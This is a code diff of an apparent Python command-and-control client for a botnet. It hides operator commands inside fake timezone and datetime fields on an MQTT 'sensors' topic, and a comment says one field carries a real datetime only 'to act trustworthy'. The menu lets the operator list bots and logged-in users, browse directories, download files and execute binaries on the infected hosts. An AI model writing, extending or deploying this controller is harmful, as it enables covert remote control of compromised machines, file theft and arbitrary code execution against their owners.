@@ -2,10 +2,10 @@ from paho.mqtt import client as mqtt
 from datetime import datetime
 from zoneinfo import ZoneInfo
 import threading
+import random
 import base64
 import json
 import time
-import random
 
 response_lock = threading.Lock()
 bot_responses = []
@@ -18,9 +18,11 @@ MQTT_PORT = 1883
 MQTT_TOPIC = "sensors"
 
 # Message fields
-MSG_FIELD_BOT_ID = "local_time"
-MSG_FIELD_ENCRYPTED_MSG = "leap_seconds"
+MSG_FIELD_TO_FAKE_LEGITIMATE = "local_datetime" # will send legitimate local datetime, just to act trustworthy
+MSG_FIELD_BOT_ID = "local_datetime_leap"
+MSG_FIELD_ENCRYPTED_MSG = "datetime_leap"
 MSG_FIELD_TIMEZONES = "timezones"
+MSG_FIELD_ACTION = "timezone"
 
 # Commands
 CMD_LIST_BOTS = 1
@@ -144,8 +146,7 @@ def on_connect(client, userdata, flags, rc):
     if rc == 0:
         print("Connected to MQTT Broker.")
         print(f"Subscribing to topic: {MQTT_TOPIC}.")
-        # subscribe to all subtopics to handle responses
-        client.subscribe(f"{MQTT_TOPIC}/#")
+        client.subscribe(MQTT_TOPIC)
     else:
         print(f"Failed to connect, connection return code {rc}.")
         client.disconnect()
@@ -189,8 +190,8 @@ def decode_response(payload: str):
         result["bot_id"] = bot_id
         result["message"] = message
         return result
-    except json.JSONDecodeError:
-        raise Exception("Invalid JSON payload.")
+    except Exception:
+        raise Exception("Invalid payload.")
 
 
 def timezone_date_time(timezone: str):
@@ -207,15 +208,11 @@ def publish_action_call(client: mqtt.Client, action_number: int, path: str = Non
         print(f"Timezone is missing for action number {action_number}")
         raise Exception(f"Timezone is missing for action number {action_number}")
 
-    timezone = COMMAND_TO_TIMEZONE[action_number]
-    if timezone is None:
-        print(f"Please add more timezones to dictionary: {action_number}")
-        return
-
-    dt = timezone_date_time(timezone)
+    action_as_timezone = COMMAND_TO_TIMEZONE[action_number]
+    dt = timezone_date_time(action_as_timezone)
     
     msg = {
-        "timezone": timezone,
+        MSG_FIELD_ACTION: action_as_timezone,
         "datetime": dt.isoformat()
     }
 
@@ -236,31 +233,32 @@ def wait_for_responses(timeout=5):
         for response in bot_responses:
             print(f"\t- {response["bot_id"]}: {response["message"]}")
 
+
 def user_actions(client: mqtt.Client):
     retry = True
     while retry:
         try:
             retry = False
             print("Actions:")
-            print("\t[1] List alive bots.")
-            print("\t[2] List logged in users.")
-            print("\t[3] List content of specified directory.")
-            print("\t[4] Print ID of user running the bot.")
-            print("\t[5] Download specified file.")
-            print("\t[6] Execute a binary.")
+            print(f'\t[{CMD_LIST_BOTS}] List alive bots.')
+            print(f'\t[{CMD_LIST_USERS}] List logged in users.')
+            print(f'\t[{CMD_LIST_DIR}] List content of specified directory.')
+            print(f'\t[{CMD_GET_USER_ID}] Print ID of user running the bot.')
+            print(f'\t[{CMD_DOWNLOAD_FILE}] Download specified file.')
+            print(f'\t[{CMD_EXECUTE_BINARY}] Execute a binary.')
             print("\t[Q] Quit.")
 
             action = input("Select action: ").strip()
 
             path = None
-            if action in ["3", "5", "6"]:
+            if action in [str(CMD_LIST_DIR), str(CMD_DOWNLOAD_FILE), str(CMD_EXECUTE_BINARY)]:
                 path = input("Enter path: ").strip()
                 if not path:
                     print("Path cannot be empty.")
                     retry = True
                     continue
 
-            if action in ["1", "2", "3", "4", "5", "6"]:
+            if action in COMMAND_TO_TIMEZONE:
                 publish_action_call(client, int(action), path)
                 wait_for_responses()
             elif action.upper() == "Q":
@@ -277,8 +275,8 @@ def user_actions(client: mqtt.Client):
             print(f"An error occurred during action selection: {ex}")
             retry = True
 
-def main():
 
+def main():
     # create MQTT client
     client_id = f"Controller{random.randint(1, 10000)}"
     client = mqtt.Client(client_id)
@@ -289,12 +287,14 @@ def main():
     client.connect(MQTT_BROKER, MQTT_PORT)
 
     try:
-        client.loop_forever()
-    except KeyboardInterrupt:
-        client.disconnect()
+        client.loop_start()
+        user_actions(client)
     except Exception as ex:
         print(f"An error occurred: {ex}")
+    finally:
+        client.loop_stop()
         client.disconnect()
+
 
 if __name__ == "__main__":
     main()
